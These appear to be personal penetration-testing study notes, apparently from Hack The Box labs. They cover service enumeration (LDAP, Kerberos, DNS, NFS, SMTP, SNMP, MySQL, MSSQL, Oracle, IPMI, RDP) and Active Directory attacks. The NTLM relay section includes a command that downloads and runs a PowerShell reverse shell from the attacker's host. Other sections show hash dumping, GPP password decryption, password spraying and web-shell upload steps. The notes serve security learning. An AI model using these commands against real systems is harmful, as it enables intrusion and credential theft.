-b -> Searchbase as the starting point for the search instead of default.

You can find more information about how to enumerate ldap with [hacktricks](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-ldap.html?highlight=ldap%20enum#ldapsearch)

### enum users with ldapdomaindump

LDAP is used by default, we can use ldapdomaindump tool to obtain users. This only works **if we have valid credentials of a user in the domain**.

```bash
service apache2 start
```

```bash
python3 ldapdomaindump -u 'domain.local\user' -p 'password' 10.10.10.10
```

If you open html you can open html file and see the users.

https://github.com/dirkjanm/ldapdomaindump


## Kerberos

The port of Kerberos is 88

#### Enumerate valid users

If kerbero port is open(88) you can use **kerbrute** to enumerate valid users.

##### Kerbrute

Bruteforce attack to discover users through Kerberos

```bash
kerbrute userenum --dc 10.10.10.10 -d domain.htb /usr/share/wordlists/seclists/Usernames/Names/names.txt
```

You can check if is a valid using crackmapexec tool:, you have to indicate the type of auth(by default is with NTLM, now with kerberos).
```bash
crackmapexec smb 10.10.10.175 -u 'fsmith' -p '' -d EGOTISTICALBANK --kerberos
```

You can found that is vulnerable to "x" attack an a way to identificate valid user.

### Other techniques

> [!NOTE]
> **Other techniques**
> - User and Password Sprying via SMB
> - Abusing GPP

#### User and password sprying

When you found valid credentials of an administrator of the domain you can do user and password sprying to check for what computer is valid
```bash
crackmapexec 10.10.10.0/24 -u 'user' -p 'password'
```

#### Leaked files
##### Abusing GPP(Group Policy Preferences) Passwords

> [!NOTE]
> **DOMAIN CONTROLER SYSVOL SHARED RESOURCE**
> If you are in a domain controlled and you're allowed to see the content of this resource or a similar structure you can found credentails inside. The path normally is this:
> > smbmap -H 10.10.10.10 -r Policies/{31B...-5661...-725}/MACHINE/Preferences/Groups/Groups.xml
> 
> To crack the hash you can use `gpp-decrypt` tool(Microsoft shared the AES-key).



### Extra advices
#### If you find the name of the domain, add to the /etc/hosts

If the domain have a name add to /etc/hosts
```
10.10.10.10 domain.htb
```

## DNS

```bash
dig 10.129.56.200
```

Obtain the SOA record
```bash
dig soa www.sergiky.github.io
```

The dot is replaced by a @, e.g: `awsdns-hostmaster.amazon.com` -> `awsdns-hostmaster@amazon.com`

Obtain the NS
```bash
dig ns inlanefreight.htb @10.129.14.128
```

Obtain the text reigister.
```bash
dig CH TXT version.bind 10.129.120.85
```

Obtain any register:
```bash
dig any inlanefreight.htb @10.129.14.128
```

Do a zone transfer
```bash
dig axfr inlanefreight.htb @10.129.14.128
```

Introduce the DNS victim IP.

Sometimes the DNS server can use virtual hosting and manage multiple zones. Therefore, you can ask with the same DNS to different subdomains. This can lead to show different entries which belongs to a **internal subdomain**.

```bash
dig axfr internal.inlanefreight.htb @10.129.56.224
```

 
Bruteforce subdomain to find subodmains
```bash
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```

You have tools such as DNSenum:
```bash
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```


## Virtual hosting

### gobuster

```bash
gobuster vhost -u http://<target_IP_address> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
```

`--append-domain`: Appends the base domain to each word in the wordlist. This is mandatory to use when perform virtual hosting with gobster.

There are some arguments that are worth knowing:
- Consider using the `-t` flag to increase the number of threads for faster scanning.
- The `-k` flag can ignore SSL/TLS certificate errors.
- You can use the `-o` flag to save the output to a file for later analysis.

If is in some port, you need to add to IP + hostname in `/etc/hosts` and in the scan indicate the port.
```bash
gobuster vhost -u http://inlanefreight.htb:1234 -w ...
```

### Feroxbuster

### ffuf


## NFS
Network File System has the same purpose as SMB. It is exposed on TCP and UDP ports **111** and **2049**.


Show the mounts of the target NFS
```bash
showmount -e 10.129.14.128

Export list for 10.129.14.128:
/mnt/nfs 10.129.14.0/24
```

Mount the NFS of the target
```bash
mkdir target-NFS
sudo mount -t nfs 10.129.14.128:/ ./target-NFS/ -o nolock
cd target-NFS
tree .

.
└── mnt
    └── nfs
        ├── id_rsa
        ├── id_rsa.pub
        └── nfs.share
```

List contents with usernames & groups names
```bash
ls -l mnt/nfs/

total 16
-rw-r--r-- 1 cry0l1t3 cry0l1t3 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 cry0l1t3 cry0l1t3  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1 root     root     1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1 root     root      348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1 root     root        0 Sep 19 17:22 nfs.share
```

List contents with UIDs & GUIDs
```bash
ls -n mnt/nfs/

total 16
-rw-r--r-- 1 1000 1000 1872 Sep 25 00:55 cry0l1t3.priv
-rw-r--r-- 1 1000 1000  348 Sep 25 00:55 cry0l1t3.pub
-rw-r--r-- 1    0 1000 1221 Sep 19 18:21 backup.sh
-rw-r--r-- 1    0    0 1872 Sep 19 17:27 id_rsa
-rw-r--r-- 1    0    0  348 Sep 19 17:28 id_rsa.pub
-rw-r--r-- 1    0    0    0 Sep 19 17:22 nfs.share
```

If the `root_squash` option is set, we cannot edit the `backup.sh` file even as root.

We can use NFS for escalation. If we have access to the system via SSH and want to read files from another folder that a specific user can read, we would need to upload a shell to the NFS share that has the `SUI` of that user and then run the shell via the SSH user.


To unmount
```bash
cd ..
sudo umount ./target-NFS
```


## SMTP
Use port 25, 587 or 465

You can grab the banner with `nc`
We can intercept the traffic with tcpdump

You can use Telnet to interact with a SMTP server:
```bash
telnet 10.129.14.128 25
```

When you work through a web proxy, you can make connect the proxy with SMTP server with the command:
```bash
CONNECT 10.129.14.128:25 HTTP/1.0
```

You can use different commands such as:
- `HELO` or `EHLO`: Initialization of the session, e.g: `HELO mail1.inlanefreight.htb`

### Validate users
- `VRFY`: Enumerate existing users on the system. e.g: `VRFY root`. This not always work, all SMTP response codes can be found [here](https://serversmtp.com/smtp-error/)

#### smtp-user-enum
You can use the following tool to enumerate smtp users
```bash
smtp-user-enum -M VRFY -U ~/Downloads/4mvQ7mgk.txt -t 10.129.6.156
```

It is possible that **some SMTP server need a little more time** to respond instead of the default time. Therefore, you can use the `-w <time>` parameter.

```bash
smtp-user-enum -M VRFY -U ~/Downloads/4mvQ7mgk.txt -t 10.129.6.156 -w 30
```


How to send an email:
```bash
telnet 10.129.14.128 25
EHLO inlanefreight.htb
MAIL FROM: cry0l1t3@inlanefreight.htb
RCPT TO: mrb3n@inlanefreight.htb NOTIFY=success,failure
DATA
From: cry0l1t3@inlanefreight.htb
To: mrb3n@inlanefreight.htb
Subject: DB
Date: Tue, 28 Sept 2021 16:32:51 +0200

Hey man, I am trying to access our XY-DB but the creds don't work. Did you make any changes there?
.
QUIT
```

### nmap scripts
In nmap you can scripts like `smtp-commands` (-sCV), list all the possible commands.

```bash
sudo nmap 10.129.14.128 -sC -sV -p25
```

Also you can use `smtp-open-relay` to identify open relay. Open relay is a misconfiguration server that allow to any people with any email without authentication to send emails everywhere.
```bash
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

### IMAP / POP3

IMAP Port: 143 or 993 (encrypted)
POP3 Ports: 110 and 995 (encrypted)

#### cURL

```bash
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
```

If you add the **verbose** `-v` option, we will see the version of TLS, details about SSL certificate and even the banner, which will often contain the version of the mail server.

#### interact POP3 with TLS
Sometimes you can find the version of the service here.

You can use openssl:
```bash
openssl s_client -connect 10.129.14.128:pop3s
```


### Default credentals
Try default credentials:
- admin:admin
- root:root
- user:password

#### POP3 commands
|                 |                                                             |
| --------------- | ----------------------------------------------------------- |
| `USER username` | Identifies the user.                                        |
| `PASS password` | Authentication of the user using its password.              |
| `STAT`          | Requests the number of saved emails from the server.        |
| `LIST`          | Requests from the server the number and size of all emails. |
| `RETR id`       | Requests the server to deliver the requested email by ID.   |
| `DELE id`       | Requests the server to delete the requested email by ID.    |
| `CAPA`          | Requests the server to display the server capabilities.     |
| `RSET`          | Requests the server to reset the transmitted information.   |
| `QUIT`          | Closes the connection with the POP3 server.                 |


#### Interact IMAP with TLS

```bash
openssl s_client -connect 10.129.14.128:imaps
```

#### IMAP commands

You usually have to add a tag to identify the command, e.g: `tag_simple LOGIN username password`.

|                                 |                                                                                                               |
| ------------------------------- | ------------------------------------------------------------------------------------------------------------- |
| `1 LOGIN username password`     | User's login.                                                                                                 |
| `1 LIST "" *`                   | Lists all directories.                                                                                        |
| `1 CREATE "INBOX"`              | Creates a mailbox with a specified name.                                                                      |
| `1 DELETE "INBOX"`              | Deletes a mailbox.                                                                                            |
| `1 RENAME "ToRead" "Important"` | Renames a mailbox.                                                                                            |
| `1 LSUB "" *`                   | Returns a subset of names from the set of names that the User has declared as being `active` or `subscribed`. |
| `1 SELECT INBOX_NAME`           | Selects a mailbox so that messages in the mailbox can be accessed.                                            |
| `1 UNSELECT INBOX`              | Exits the selected mailbox.                                                                                   |
| `1 FETCH <ID> all`              | Retrieves data associated with a message in the mailbox, except the body.                                     |
| `1 FETCH <ID> BODY[]`           | Retrieves the body of the email                                                                               |
| `SEARCH DELETED`                | Search deleted messages                                                                                       |
| `1 CLOSE`                       | Removes all messages with the `Deleted` flag set.                                                             |
| `1 LOGOUT`                      | Closes the connection with the IMAP server.                                                                   |

### SNMP
UDP ports 161 and 162.

There are SNMPv1, SNMPv2 and SNMPv3. The last one have strong security measures like authentication. The transition to SNMPv3 is very complex.

#### snmpwalk

```bash
snmpwalk -v2c -c public 10.129.14.128
```

#### onesixtyone
Used to brute-force the names of the community strings since they can be named arbitrarily by the administrator.

```bash
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
```

It is possible that certain community strings in the same network have some pattern. We can use [crunch](https://secf00tprint.github.io/blog/passwords/crunch/advanced/en) to create custom wordlists. 

Once we know a community string, we can use it with braa to brute-force the individual OIDs and enumerate the information behind them.

#### braa
To brute-force the individual OIDs and enumerate the information behind them.

```bash
braa <community string>@<IP>:.1.3.6.*
```

```bash
braa public@10.129.14.128:.1.3.6.*
```

### MySQL

Port: 3306

SQL scripts
```bash
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

Use mysql without password
```bash
mysql -u root -h 10.129.14.132
```

Use mysql with password
```bash
mysql -u root -pP4SSw0rd -h 10.129.14.12
```

The most important tables are `system schema` (sys) and `information schema` (information_schema). The system schema contains tables, information and metadata necessary for the management.

You can see different connections from the sys table. It is interesting to do lateral movement later.
```mysql
use sys;
show tables;

...

select host, unique_users from host_summary;
```

#### Commands
|                                                      |                                                                                                       |
| ---------------------------------------------------- | ----------------------------------------------------------------------------------------------------- |
| `mysql -u <user> -p<password> -h <IP address>`       | Connect to the MySQL server. There should **not** be a space between the '-p' flag, and the password. |
| `show databases;`                                    | Show all databases.                                                                                   |
| `use <database>;`                                    | Select one of the existing databases.                                                                 |
| `show tables;`                                       | Show all available tables in the selected database.                                                   |
| `show columns from <table>;`                         | Show all columns in the selected table.                                                               |
| `select * from <table>;`                             | Show everything in the desired table.                                                                 |
| `select * from <table> where <column> = "<string>";` | Search for needed `string` in the desired table.                                                      |

### MSSQL
Port: 1433 and 1434

Microsoft SQL. SQL Server Management Studio (`SSMS`) is the main application to manage this database. But you have other such as:
- mssql-cli
- SQL Server PowerShell
- HeidiSQL
- SQLPro
- Impacket's mssqlclient.py

| Default System Database | Description                                                                                                                                                                                            |
| ----------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| `master`                | Tracks all system information for an SQL server instance                                                                                                                                               |
| `model`                 | Template database that acts as a structure for every new database created. Any setting changed in the model database will be reflected in any new database created after changes to the model database |
| `msdb`                  | The SQL Server Agent uses this database to schedule jobs & alerts                                                                                                                                      |
| `tempdb`                | Stores temporary objects                                                                                                                                                                               |
| `resource`              | Read-only database containing system objects included with SQL server                                                                                                                                  |
When an admin initially install and configures MSSQL to be network accessible, the SQL service will likely run as `NT SERVICE\MSSQLSERVER`. Connection from the client is possible through Windows Authentication. Windows Authentication use the local SAM or the domain controller.

Some dangerous settings:
- Not using encryption to connect to the MSSQL server
- The use of self-signed certificates
- The use of named pipes.
- It is possible that the admin don't disable the `sa` account

Using nmap scripts:
```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

Use the module `mssql_ping` of Metasploit that will scan the MMSQL service and provide useful information.
```msfconsole
msf6 auxiliary(scanner/mssql/mssql_ping) > set rhosts 10.129.201.248

...

[*] 10.129.201.248:       - SQL Server information for 10.129.201.248:
[+] 10.129.201.248:       -    ServerName      = SQL-01
[+] 10.129.201.248:       -    InstanceName    = MSSQLSERVER
[+] 10.129.201.248:       -    IsClustered     = No
[+] 10.129.201.248:       -    Version         = 15.0.2000.5
[+] 10.129.201.248:       -    tcp             = 1433
[+] 10.129.201.248:       -    np              = \\SQL-01\pipe\sql\query
[*] 10.129.201.248:       - Scanned 1 of 1 hosts (100% complete)
```

Connect with  an impacket tool, mssqlclient.py:
```bash
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```
mssqclient have their own command, write help to see them.

### Oracle TNS
Oracle Transparent Network Substrate (TNS) server is a protocol that facilitates communication between Oracle databases and applications over the network. Support UPX/SPX and TCP/IP stacks. Support IPv6 and SL/TLS.

The default port is TCP **1521**. However, it can be changed.

Tge Iracke DBSBNO service also use a default password, `dbsnmp`.
Someone use the Finger service (port 79) that is inherently insecure

Tools necessary to interact with TNS listener of Oracle.
#### Setting up ODAT
```bash
sudo apt-get update
sudo apt-get install -y build-essential python3-dev libaio1
cd ~
wget https://files.pythonhosted.org/packages/source/c/cx_Oracle/cx_Oracle-8.3.0.tar.gz
tar xzf cx_Oracle-8.3.0.tar.gz
cd cx_Oracle-8.3.0
python3 setup.py build
sudo python3 setup.py install
cd ~
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init
git submodule update
sudo apt-get install python3-scapy -y
sudo pip3 install colorlog termcolor passlib python-libnmap
sudo apt-get install build-essential libgmp-dev -y
pip3 install pycryptodome
pip3 install openpyxl
```

To testing or use ODAT:
```bash
./odat.py -h
```

#### Enumerating SID
In Oracle an SID identify a particular database instance.

There are multiples tools that bruteforce/guess the SSID to 
##### nmap
```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

##### ODAT

These scans can retrieve database names, version, running process, user accounts, vulnerabilities... We can use the `all` options.

```bash
./odat.py all -s 10.129.204.235
```

If this report a valid user we can try to log in with sqlplus.
##### SQLplus
One time you have a valid user, to connect it, you can use SQLplus.

First, if you're using Pwnbox of hackthebox you need to update and upgrade parrot-core and install `oracle-instantclient-sqlplus` package.

```bash
sudo apt update
sudo apt upgrade parrot-core
sudo apt update
sudo apt install oracle-instantclient-sqlplus
```

If you come across the following error: 
```bash
sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory
```

Please execute the following:
```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

No, you can execute `sqlplus`, to check if the tools will be executed withour errors you can use verbose flag.
```bash
sqlplus -v
```

###### Log In with SQLplus

```bash
sqlplus scott/tiger@10.129.204.235/XE
```

###### Useful commands in Oracle

Show all the tables of the database:
```oracle
select table_name from all_tables;
```


Show the privileges of the current users:
```oracle
select * from user_role_privs;

...

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```


We found a user, we can try to log in as `sysdba`, giving us higher privileges. This is possible when the user has the appropriate privileges typically granted by the database administrador.

```bash
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

You can see what roles have the users:
```bash
select * from user_role_privs;
```

###### Extract password hashes

At this point, with **sysdba** we can not create users or make modifications. However, we could retrieve the password hashes from the `sys.user$` and try to crack them offline.

```oracle
select name, password from sys.user$;
```

###### Upload a web shell
We can upload a web shell, however, this requires the server to run a web server, and we need to know the exact location of the root directory. Nvertheless, if we know what type of system we are dealing with, we can try the default paths, which are:
- `/var/www/html`
- `C:\inetpub\wwwroot`

First, we need to take an exploitation approach with files that do not look dangerous for Antivirus or Intrusion detection/prevention system is always important.

Therefore, we create a text file with a string:
###### Oracle RDBMS - File Upload

Testing file to see if antivirus detect as malicious.
```bash
echo "Oracle File Upload Test" > testing.txt
```

Upload the file
```bash
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Finally, we can try if was upload with cURL:
```bash
curl -X GET http://10.129.204.235/testing.txt
```

###### Commands
To see more commands, you can check: https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985

### IPMI
Intelligent Platform Management Interface (IPMI). Used for management systems and monitoring. It acts as an autonomous subsystem and works independently  of the host's BIOS, CPU, firmware, and underlying operating system. IPMI have the ability to manage and monitor systems even if they are power off or in a unresponsive state. It use a direct network connection to the system's hardware and does not require access to the operating system via a login shell. IPMI can monitor a range of different things such as system temperature, voltage, fan status, power supplies... The host system can be powered off, but the IPME module **requires a power source and a LAN connection** to work correctly.

**Port UDP 623**

Systems that use IPMI protocol are called Baseboard Management Controllers (BMCs)

If we can access a BMC during an assessment, we would gain full access to the host motherboard and be able to monitor, reboot, power off, or even reinstall the host operating system.

#### nmap scripts

```bash
sudo nmap -sU --script ipmi-version -p 623
```

#### metasploit
We can use `ipmi_version` module:
```msfconsole
use auxiliary/scanner/ipmi/ipmi_version 
set rhosts 10.129.42.195
run
```

#### Default password of BMCs
|                 |               |                                                                           |
| --------------- | ------------- | ------------------------------------------------------------------------- |
| Dell iDRAC      | root          | calvin                                                                    |
| HP iLO          | Administrator | randomized 8-character string consisting of numbers and uppercase letters |
| Supermicro IPMI | ADMIN         | ADMIN                                                                     |

#### Obtain Password hash
We can turn to a flaw in the RAKP protocol in IPMI 2.0. During the authentication process, the server sends a salted SHA1 or MD5 hash of the user's password to the client before authentication takes places.

It is important to not overlook IPMI during internal penetration tests, because we can obtain access to BMC web console, the password that you find can be re-used across other system.

To crack, we can use the `ipmi_dumphashes` module of metasploit.

```msfconsole
use auxiliary/scanner/ipmi/ipmi_dumphashes
set rhosts 10.129.42.195
run
```

> Experimenting with different word lists is crucial for obtaining the password from the acquired hash.

##### Crack the hash

You can use Hashcat mode 7300

In the event of an HP iLO using a factory default password, we can use this Hashcat  mask attack:
```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

### Rsync
 TCP Port 873

Different ways about how rsync can be abused: 
https://hacktricks.wiki/en/network-services-pentesting/873-pentesting-rsync.html


```bash
sudo nmap -sV -p 873 127.0.0.1
```

Probing for Accessible Shares to see what we can gain access to:
```bash
nc -nv 127.0.0.1 873
```

We see some interesting resource, now we can enumerate it further:
```bash
rsync -av --list-only rsync://127.0.0.1/dev
```

We can sync all files to our attack host with the command:
```bash
rsync -av rsync://127.0.0.1/dev
```

If rsync is configured to use SSH to transfer files, we could modify our commands to include the  `-e ssh` or with a non-standard port: `-e "ssh -p2222"`.

### R-services | rcp | rexec | rlogin | rsh | rstat | ruptime | rwho

Ports: 512, 513 and 514.

They are accessible only through a suite of programs known as `r-commands`.
They are most commonly used by commercial operating system such as Solaris, HP-UX, and AIX.

The host and user of `/etc/hosts.equiv` automatically granted access without further authentication.

`.rhosts` is a per-user configuration file. The `+` are used as wildcard to specify anything.

#### Logging using Rlogin
```bash
rlogin 10.0.17.2 -l htb-student
```

We can also abuse the `rwho` command to list all interactive sessions on the local network by sending requests to the UDP port 513.

```bash
rwho
```

#### Listing authenticated users with rusers
```bash
rusers -al 10.0.17.5

....

htb-student     10.0.17.5:console          Dec 2 19:57     2:25
```

### RDP
Port TCP/UDP 3389

You can use nmap scripts, it is a little be risky because the content of the package sent by nmap have the content `nmap`.
```bash
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
```

There is a script in perl developed by Cisco Security Labs that can unauthentically identify the security settings of RDP servers based on the handshakes. This is more secure to use to avoid EDR.
https://github.com/CiscoCXSecurity/rdp-sec-check

cpan is the npm of perl
```bash
sudo cpan
install Encoding::BER
```

```bash
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check

./rdp-sec-check.pl 10.129.201.248
```

If you have some special character it is possible that you have to escape with `\`.

#### Connecting

##### xfreerdp
We can connect by several  ways such as `xfreerdp`, `rdesktop` or `Remmina`.
```bash
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
```

Sometimes you have to escape some characters like `!` -> `\!`

If you don't connect with one client you can try with others one such as: 

##### remmina.

##### rdesktop

```bash
rdesktop -u htb-student -p HTB_@cademy_stdnt! 10.129.34.4
```


### WinRM
Remote command line.
TCP Port: `5985` and `5986` for HTTPS

Another component is `WinRS` 

Is enable by default in Windows Server 2012.

#### nmap scripts
```bash
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```

#### How to connect

For Windows: https://docs.microsoft.com/en-us/powershell/module/microsoft.wsman.management/test-wsman?view=powershell-7.2
For Linux: https://github.com/Hackplayers/evil-winrm

### WMI
Allows read and write access to almost all settings on Windows systems.

Normally access by Powershell, VBScript, or the Windows Management Instrumentation Console (`WMIC`).

#### How to connect
```bash
/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```


### Admin panel
If you see an admin panel detect the technology.
**Try to search the default credentials.**

### Squid proxy

When you have a squid proxy you can enumerate ports that are open in the squid proxy:
You have to add the squid proxy to proxychains configuration:
```
http 10.10.10.224 3128
```

Then you can enumerate with nmap again(remember to use -sT & -Pn)

```bash
proxychains -q nmap -sT -Pn -v -n 127.0.0.1 -oN allPortsSquidProxy
```

#### Internal squid proxy

If you find some domain that you don't reach and you think or found an internal proxy(ex: using dnsenum you find proxy.domain.htb) you can try to connect to this proxy adding this line to proxychains.conf. After you can try to scan the domains. This use the internal network of the squid proxy machine to try to communicate with others machines.

```
http    127.0.0.1 3128
```

When you use a proxy(or more than one like this case) nmap is very slowly, you can create your own portscan in bash: 
```bash
#!/usr/bin/env bash

for port in $(seq 1 65525); do
	proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.197.243.77/$port" 2>/dev/null && echo "[+] $port - OPEN" &
done; wait
```

Sometimes the scan forget some port, is recommendable to do again.

And if you scan the machine and found that port 3128 is open you can try to add again the squid proxy to proxychains.conf and scan another host or the network.

Script in bash to find new machines with open ports through proxychains:
```bash
#!/usr/bin/env bash

for port in 21 22 25 53 80 88 443 445 8080 8081; do
	for i in $(seq 1 254); do
		proxychains -q timeout 1 bash -c "echo '' > /dev/tcp/10.241.251.$i/$port" 2>/dev/null && echo "[+] Port $port - OPEN on host 10.241.251.$i" &
	done
done; wait
```

## Web enumeration
Web enumeration required a clear methodology.

In real websites you need to have a very good concept of a **passive reconnaissance** and an **active reconnaissance**.

### First view
Before you visit a website from the first time, I recommend to open burp to register request (without plugins and scan if you want to do in a passive approach), see robots.txt, sitemap.xml, open the dev console to see information, visualize the source code, inspect the technologies with wappalyzer/what-web.

### Passive

#### whois

```
whois facebook.com
```


### Active

Using whatweb
```bash
whatweb --no-errors 10.10.10.0/24
```

#### Other useful tools for first view

##### Banner grabbing / Web server headers

###### Curl
```
curl -IL https://www.inlanefreight.com
```

#### Some important path or files to check
- robots.txt
- sitemap.xml
- /.well-known directory. Have metadata and configuration files. 
	- `/.well-kown/security.txt`: Contain contact infromatin for security researchers to report vulnerabilities
	- `/.well-kown/change-password`: Provides a standard URL for directing users to a password change
	- `/.well-kown/openid-configuration`: Defines configuration details for OpenID Connect.
	- `/.well-kown/assetlinks.json`: Used for verifying ownership of digital assets (e.g apps) associated with a domain.
	- `/.well-kown/mta-sts.txt`: Specifies the policy for SMTP MTA SSL.

More information in https://github.com/google/digitalassetlinks/blob/master/well-known/ and https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml

`openid-configuration` returns a JSON document containing metadata about the provider's endpoints, supported authentication methods...

#### Web crawler

##### Scrapy

To install
```bash
pip3 install scrapy
```

##### ReconSpider

To install it.
- You need to install srapy
Download the file:
```bash
wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip
unzip ReconSpider.zip
```

To use it:
```bash
python3 ReconSpider.py http://inlanefreight.com
```

The data returned is in a json format

#### EyeWitness
You have [EyeWitness](https://github.com/RedSiege/EyeWitness) tool that make an screenshot of websites and obtain information, identify credentials...

#### Directory file enumeration
Sometimes you need to obtain more information from a website that is hidden, you can perform DNS, vhost, and directory brute-forcing, enumerate AWS W3 bucket with different tools.

##### GoBuster

Find potential hidden path
```bash
gobuster dir -u https://10.10.10.10/ -w /usr/share/wordlist/seclists/Discovery/Web-Content/common.txt
```


Find subdomains with DNS

It is possible you need to have at least one dns server in /etc/resolv.conf:
`nameserver 1.1.1.1`

```bash
gobuster dns -d 154.57.164.62:32148 -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
```

```bash
gobuster vhost -u http://siteisup.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 --append-domain
```

##### Ffuf

Find subdomains
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" | grep -vE "Words: 186"
```

##### Wfuzz

#### Certificates
SSL/TLS certificates can reveal data like company name and email address. Useful for phishing attack if this is within the scope of assessment. 


# Attack UDP services
If you don't have the opportunity of doing nothing with TCP Ports you can scan UDP ports!

### SNMP services

Simple Network Management Protocol (SNMP use UDP port 161 and 162). This protocol provide information and statics about a router or device, helping us to gain access to it.


Request the name of the system
```bash
snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0
```

#### onesixtyone
https://github.com/trailofbits/onesixtyone

The following tool can be used to brute force the community string names using a dictionary file of common community strings such as the dict.txt file included in the GitHub repo.

```bash
onesixtyone -c dict.txt 10.129.42.254
```

It can give you the name of a community string. You can obtain a lot of information with this community string using the following command:
```bash
snmpwalk -v 2c -c backup 10.129.19.54
```

If you want to obtain more information about some OID you can replace the word "iso" by "1".
```snmp
iso.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4 = STRING: "Changing password for tom."

to

1.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4
```

Then:
```bash
snmpget -v2c -c backup 10.129.19.54 1.3.6.1.2.1.25.1.7.1.4.1.2.6.66.65.67.75.85.80.4
```

You can obtain information in a human-readable way:
```bash
snmp-check -c backup 10.129.19.54
```

# Types of attack

> [!NOTE]
> **Types of attacks**
> - SAMBA Relay
> - NTLM Relay
> 	- IPv4
> 	- IPv6
> - AS-REP Roast/Roasting
> - Kerberoasting
> - DCSync

## SAMBA Relay

> [!WARNING]
> **Prerequisites**
>- The signature must to be enable but no required or disabled
> - Must be on the local network
> - User credentials must have remote login access.

You as an attacker start a SMB Server that responds to all SMB requests that doesn't exist obtained the hash NTLM of the user.


This is better to do on-site in place of use a vpn.

Configure file: Responder.conf

By default the idea is wait that some user try to access to a share resource of SMB and made a mistake writing or the SMB server is off. 

With this, you obtain the hash NTLM of the user, you can't do PTH(Pass The Hash) but you can try to crack it.

If some administrator account is running some service in the network with SMB you can get their credentials. This technique is slow but very easy to do.

```bash
python3 Responder.py -I eth0 -rdw
```

When you obtain the hash you can try to crack it:
```bash
john --wordlist=rockyou.txt hashes
```

## NTLM Relay

> [!WARNING]
> **Prerequisites**
> - The signature must to be enable but no required or disabled
> - Must be on the local network
> - User credentials must have remote login access.

### IPv4
Try to obtain some hash ntlm and check if is an administrator credential of the computers that we indicate in a file. 

In the configuration file of the responder(/usr/share/responder/Responder.conf) you can change the value of SMB and HTTP to **off**.

You can create a file with the IP of the target.

The idea is to obtain the authentication obtained with responder and redirect the flow of the auth to the victim machine(indicated in the file) to test if the ntlm is valid and obtain automatically the SAM of the victim machine.
```bash
python3 Responder.py -I eth0 -rdw
```

```bash
ntlmrelayx.py -tf targets.txt -smb2support
```

targets.txt -> Have the computers victim that try the credentials to check if are administration users of the computer and obtain automatically the SAM.

#### Execute commands

You can execute commands and example is obtained a reverse shell.

You have a powershell reverse shell ready and running a python server.
```
python3 -m http.server 8000
```

You have to listening the reverse shell.
```bash
rlwrap nc -nlvp 4646
```

Then with ntlmrelay you can execute command to obtain the reverse shell:
```bash
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/revshell.ps1:8000')"
```

Start the responder to poisoning the service.
```bash
python3 Responder.py -I eth0 -rdw
```

### IPv6

Sometimes with IPv4 is all well parched and you can't do nothing but sometimes forget to protect IPv6.

You can use mitm6 tool to poisoning the domain and with ntlmrelay we can create a tunnel and use proxychains to connect.

By default, windows machine request IPv6 traffic

With this tool if you check the poisoned computers the **gateway** have your IPv6(IPv6 of you attacking machine) and the **main DNS** with your IPv6. 

```bash
mitm6 -d domain.local
```

Create an interactive session of relays:
```bash
ntlmrelayx.py -6 -wh 10.10.10.10(attacker machine) -t smb://10.10.10.15(victim machine) -socks -debug -smb2support
```

